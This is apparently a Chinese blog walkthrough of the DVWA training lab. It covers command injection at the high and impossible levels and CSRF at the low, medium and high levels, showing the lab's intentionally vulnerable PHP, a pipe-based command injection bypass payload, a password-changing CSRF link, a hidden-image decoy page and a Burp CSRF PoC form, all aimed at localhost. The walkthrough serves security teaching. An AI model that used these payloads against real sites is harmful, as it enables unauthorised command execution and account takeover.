+<h4 id="DVWA-Security：high-1"><a href="#DVWA-Security：high-1" class="headerlink" title="DVWA Security：high"></a>DVWA Security：high</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	<span class="variable">$target</span> = trim(<span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ]);</span><br><span class="line">	<span class="comment">// Set blacklist</span></span><br><span class="line">	<span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;| &#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;$&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;(&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;)&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;`&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">	);</span><br><span class="line">	<span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">	<span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line">	<span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">	<span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">		<span class="comment">// Windows</span></span><br><span class="line">		<span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// *nix</span></span><br><span class="line">		<span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// Feedback for the end user</span></span><br><span class="line">	<span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>high级别的代码中添加了更严格的过滤，过滤了&amp;、;、| 、-、$、(、)、`、||。</p>
+<p>过滤了”| “（后面多个空格），只要没有空格就可以绕过，就不会被滤掉，</p>
+<p>payload：<code>127.0.0.1|dir</code></p>
+<p><img src="https://s2.ax1x.com/2019/10/04/uD0HZd.png" alt="uD0HZd.png"></p>
+<h4 id="DVWA-Security：impossible"><a href="#DVWA-Security：impossible" class="headerlink" title="DVWA Security：impossible"></a>DVWA Security：impossible</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">	// Check Anti-CSRF token</span><br><span class="line">	checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class="line">	// Get input</span><br><span class="line">	$target = $_REQUEST[ &#x27;ip&#x27; ];</span><br><span class="line">	$target = stripslashes( $target );</span><br><span class="line">	// Split the IP into 4 octects</span><br><span class="line">	$octet = explode( &quot;.&quot;, $target );</span><br><span class="line">	// Check IF each octet is an integer</span><br><span class="line">	if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123;</span><br><span class="line">		// If all 4 octets are int&#x27;s put the IP back together.</span><br><span class="line">		$target = $octet[0] . &#x27;.&#x27; . $octet[1] . &#x27;.&#x27; . $octet[2] . &#x27;.&#x27; . $octet[3];</span><br><span class="line">		// Determine OS and execute the ping command.</span><br><span class="line">		if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">			// Windows</span><br><span class="line">			$cmd = shell_exec( &#x27;ping  &#x27; . $target );</span><br><span class="line">		&#125;</span><br><span class="line">		else &#123;</span><br><span class="line">			// *nix</span><br><span class="line">			$cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">		&#125;</span><br><span class="line">		// Feedback for the end user</span><br><span class="line">		$html .= &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		// Ops. Let the user name theres a mistake</span><br><span class="line">		$html .= &#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><em>stripslashes(string)</em></p>
+<p>stripslashes函数会删除字符串string中的反斜杠，返回已剥离反斜杠的字符串。</p>
+<p><em>explode(separator,string,limit)</em></p>
+<p>把字符串打散为数组，返回字符串的数组。参数separator规定在哪里分割字符串，参数string是要分割的字符串，可选参数limit规定所返回的数组元素的数目。</p>
+<p><em>is_numeric(string)</em></p>
+<p>检测string是否为数字或数字字符串，如果是返回TRUE，否则返回FALSE。</p>
+<p>可以看到，Impossible级别的代码加入了Anti-CSRF token，同时对参数ip进行了严格的限制，只有诸如“数字.数字.数字.数字”的输入才会被接收执行，因此不存在命令注入漏洞。</p>
+</blockquote>
+<p> <strong>如何测试命令注入</strong></p>
+<p> 总结<br>命令注入漏洞是特别危险的，因为它们允许未经授权的执行操作系统命令， 它们的存在，因为应用程序无法正确地验证和消毒，使用时调用shell的功能，如的参数。 攻击者与控制这些参数可以欺骗应用程序执行任何系统命令自己的选择。<br>例如，UNIX应用程序列出了使用的文件夹的内容。 它需要的字符串FOLDER_NAME，从用户，没有任何验证，连接到“ls”的建立实际的命令。 应用程序，然后通过命令（“LS FOLDER_NAME “）的系统（）函数，并获取结果。 一个命令注入漏洞，允许攻击者注入额外的命 令在输入字符串FOLDER_NAME的， 其结果是被欺骗应用程序执行攻击者的额外的命 令。<br>为了正确测试命令注入漏洞，应遵循以下步骤：<br> 第1步： 了解攻击场景<br> 第2步： 分析原因及对策<br> 第3步： 开始试验和探索<br> 第4步： 微调测试案例</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/116714.html">参考文章1</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/blackhat520/p/4207030.html">参考文章</a></p>
+<h3 id="CSRF-Cross-site-request-forgery"><a href="#CSRF-Cross-site-request-forgery" class="headerlink" title="CSRF(Cross-site request forgery)"></a>CSRF(Cross-site request forgery)</h3><p>CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。</p>
+<h4 id="DVWA-security-low"><a href="#DVWA-security-low" class="headerlink" title="DVWA security:low"></a>DVWA security:low</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	<span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">	<span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line">	<span class="comment">// Do the passwords match?</span></span><br><span class="line">	<span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">		<span class="comment">// They do!</span></span><br><span class="line">		<span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">		<span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line">		<span class="comment">// Update the database</span></span><br><span class="line">		<span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line">		<span class="comment">// Feedback for the user</span></span><br><span class="line">		<span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Issue with passwords matching</span></span><br><span class="line">		<span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>尝试更改密码</p>
+<p><img src="https://s2.ax1x.com/2019/10/04/urieIK.png" alt="urieIK.png"></p>
+<p>链接变成了<code>http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#</code></p>
+<p>那么我们可以构造一个CSRF攻击的链接，用同一个浏览器点击这个链接<code>http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#</code></p>
+<p>就会改掉密码，变成password</p>
+<p>需要注意的是，CSRF最关键的是利用受害者的cookie向服务器发送伪造请求，所以如果受害者之前用Firefox登录的这个系统，而用Chrome点击这个链接，攻击是不会触发的，因为Chrome并不能利用Firefox的cookie，所以会自动跳转到登录界面。</p>
+<p><img src="https://s2.ax1x.com/2019/10/04/urFiY8.png" alt="urFiY8.png"></p>
+<p>构造攻击页面</p>
+<p>现实攻击场景下，这种方法需要事先在公网上传一个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成CSRF攻击。在本地写一个test.html，下面是具体代码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;</span><br><span class="line">&lt;h1&gt;404&lt;h1&gt;</span><br><span class="line">&lt;h2&gt;file not found.&lt;h2&gt;</span><br></pre></td></tr></table></figure>
+
+<p>访问test.html时，会误认为是自己点击的是一个失效的url，但实际上已经遭受了CSRF攻击，密码已经被修改为了password</p>
+<p>也可以利用bp抓包之后，利用自带的工具CSRF PoC</p>
+<p><img src="https://s2.ax1x.com/2019/10/08/uffNOf.png" alt="uffNOf.png"></p>
+<p>得到一个脚本文件，复制之后，新建一个.html文件，</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">history.pushState(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1/WWW/DVWA/vulnerabilities/csrf/&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password<span class="symbol">&amp;#95;</span>new&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password<span class="symbol">&amp;#95;</span>conf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Change&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Change&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用同一个浏览器打开，</p>
+<p><img src="https://s2.ax1x.com/2019/10/08/ufTvAf.png" alt="ufTvAf.png"></p>
+<p>点击submit</p>
+<p><img src="https://s2.ax1x.com/2019/10/08/uf7AH0.png" alt="uf7AH0.png"></p>
+<p>成功更改密码。</p>
+<h4 id="DVWA-security：medium"><a href="#DVWA-security：medium" class="headerlink" title="DVWA security：medium"></a>DVWA security：medium</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Checks to see where the request came from</span></span><br><span class="line">	<span class="keyword">if</span>( stripos( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_REFERER&#x27;</span> ] ,<span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">		<span class="comment">// Get input</span></span><br><span class="line">		<span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">		<span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line">		<span class="comment">// Do the passwords match?</span></span><br><span class="line">		<span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">			<span class="comment">// They do!</span></span><br><span class="line">			<span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">			<span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line">			<span class="comment">// Update the database</span></span><br><span class="line">			<span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">			<span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line">			<span class="comment">// Feedback for the user</span></span><br><span class="line">			<span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// Issue with passwords matching</span></span><br><span class="line">			<span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Didn&#x27;t come from a trusted source</span></span><br><span class="line">		<span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>eregi(string pattern, string string)</p>
+<p>检查string中是否含有pattern（不区分大小写），如果有返回True，反之False。这个函数可使用url二次编码绕过。</p>
+</blockquote>
+<p>使用eregi()函数检查HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名，这里是127.0.0.1），所以referer中必须含有主机地址才行</p>
+<p>使用bp抓包后，</p>
+<p><img src="https://s2.ax1x.com/2019/10/08/uf7L24.png" alt="uf7L24.png"></p>
+<p>可以像上面一样，得到一个脚本文件</p>
+<p><img src="https://s2.ax1x.com/2019/10/08/ufHIQH.png" alt="ufHIQH.png"></p>
+<p>保存成.html文件，访问之后，即可更改密码</p>
+<p><img src="https://s2.ax1x.com/2019/10/08/ufHgdx.png" alt="ufHgdx.png"></p>
+<h4 id="DVWA-security：high"><a href="#DVWA-security：high" class="headerlink" title="DVWA security：high"></a>DVWA security：high</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">	checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	<span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">	<span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line">	<span class="comment">// Do the passwords match?</span></span><br><span class="line">	<span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">		<span class="comment">// They do!</span></span><br><span class="line">		<span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">		<span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line">		<span class="comment">// Update the database</span></span><br><span class="line">		<span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line">		<span class="comment">// Feedback for the user</span></span><br><span class="line">		<span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Issue with passwords matching</span></span><br><span class="line">		<span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>high级别的代码中添加了对token的验证，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p>
+<p>参考文章<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/118352.html">https://www.freebuf.com/articles/web/118352.html</a></p>
+<p>参考文章<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaoqiyue/p/10144351.html">https://www.cnblogs.com/xiaoqiyue/p/10144351.html</a></p>
+<h3 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h3><p>File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。</p>
